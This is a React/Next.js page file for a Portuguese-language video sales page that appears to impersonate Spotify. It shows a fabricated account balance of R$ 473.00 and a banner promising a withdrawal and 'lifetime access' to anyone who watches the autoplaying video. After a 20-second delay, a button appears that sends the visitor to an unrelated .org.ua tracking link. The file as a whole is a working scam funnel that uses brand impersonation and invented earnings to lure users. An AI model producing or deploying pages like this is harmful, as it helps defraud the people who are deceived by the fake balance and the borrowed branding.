'use client';

import { useState, useEffect, useRef } from 'react';
import Image from 'next/image';
import { Button } from '@/components/ui/button';

export default function VSLPage() {
  const [showButton, setShowButton] = useState(false);
  const videoRef = useRef<HTMLVideoElement>(null);
  const [showMuteOverlay, setShowMuteOverlay] = useState(true);

  useEffect(() => {
    const timer = setTimeout(() => {
      setShowButton(true);
    }, 20000); // 20 seconds

    return () => clearTimeout(timer);
  }, []);

  const handleOverlayClick = () => {
    const video = videoRef.current;
    if (video) {
      video.muted = false;
      video.play().catch(() => {});
      setShowMuteOverlay(false);
    }
  };

  return (
    <div className="flex flex-col items-center min-h-screen bg-white text-[#333]">
      <header className="w-full bg-[#1DB954] text-white font-bold text-center p-2.5 text-base">
        ASSISTA O VÍDEO ABAIXO PARA LIBERAR SEU SAQUE E ACESSO VITALÍCIO.
      </header>
      
      <div className="w-full max-w-md bg-white p-4 border-b border-[#202020] flex items-center justify-between mb-5">
        <Image src="/opinilogo.png" alt="Spotify" width={70} height={21} className="ml-1" />
        <div className="flex flex-col items-end border-2 border-[#1DB954] rounded-md py-1 px-2.5 mr-1">
          <span className="text-xs font-bold bg-white px-1 text-[#333]">SALDO</span>
          <span className="text-sm font-bold text-[#333]">R$ 473.00</span>
        </div>
      </div>

      <main id="produto1" className="w-full max-w-md text-center px-4 mb-5">
        <h4 className="text-[#1DB954] text-lg font-bold mb-2.5">DESBLOQUEIO DE SALDO</h4>
        <p className="mb-5">Veja como liberar seu saque assistindo ao vídeo.</p>

        <div className="relative w-full" style={{ paddingTop: '56.25%' }}>
          <video
            ref={videoRef}
            id="myVideo"
            className="absolute top-0 left-0 w-full h-full"
            playsInline
            webkit-playsinline="true"
            preload="auto"
            poster="/images/thumbnail.png"
            autoPlay
            muted
          >
            <source src="https://opineartistas.shop/vsl/media/video.mp4" type="video/mp4" />
            Seu navegador não suporta o elemento de vídeo.
          </video>
          
          {showMuteOverlay && (
            <div
              id="muteOverlay"
              className="absolute top-0 left-0 w-full h-full flex justify-center items-center bg-black/50 cursor-pointer z-10"
              onClick={handleOverlayClick}
            >
              <div className="bg-[#1DB954] p-4 rounded-lg text-center text-white">
                <div className="font-bold mb-2.5">Clique aqui</div>
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="white" className="w-6 h-6 mx-auto">
                    <path d="M3 9v6h4l5 5V4L7 9H3zm13.5 3c0-1.77-1.02-3.29-2.5-4.03v8.05c1.48-.73 2.5-2.25 2.5-4.02zM14 3.23v2.06c2.89.86 5 3.54 5 6.71s-2.11 5.85-5 6.71v2.06c4.01-.91 7-4.49 7-8.77s-2.99-7.86-7-8.77z"></path>
                </svg>
                <div className="mt-2.5">para ativar o som</div>
              </div>
            </div>
          )}
        </div>

        {showButton && (
          <div className="w-full flex justify-center mt-5">
            <a href="https://ambienteseguro.org.ua/c/7b66dba7d6" className="w-full max-w-xs no-underline">
              <Button className="w-full h-12 bg-[#1DB954] text-white hover:bg-[#17a74a] font-bold">
                DESBLOQUEAR AGORA
              </Button>
            </a>
          </div>
        )}
      </main>
    </div>
  );
}
